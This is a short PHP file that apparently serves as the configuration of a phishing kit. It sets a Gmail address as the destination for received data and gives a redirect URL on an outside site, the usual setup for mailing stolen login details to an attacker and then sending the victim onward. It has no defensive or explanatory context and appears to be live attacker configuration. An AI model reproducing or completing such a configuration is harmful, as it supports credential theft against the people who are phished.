<?php 
$Receive_email="omarshefo1337@gmail.com";
$redirect="https://sz1sz.com/judgeschoice/stujudgeschoice/";
?>